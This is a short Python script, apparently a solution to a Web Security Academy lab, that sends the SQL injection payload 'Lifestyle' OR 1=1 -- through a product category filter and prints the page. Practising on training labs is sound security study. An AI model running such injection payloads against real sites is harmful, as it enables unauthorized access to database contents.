import requests

site = 'acf51f1b1e6beacac011782400fb0015.web-security-academy.net'

if __name__ == "__main__":
    def try_category(category_string):
        url = f'https://{site}/filter?category={category_string}'
        resp = s.get(url)
        print(resp.text)

    s = requests.Session()
    try_category("""Lifestyle' OR 1=1 --""")
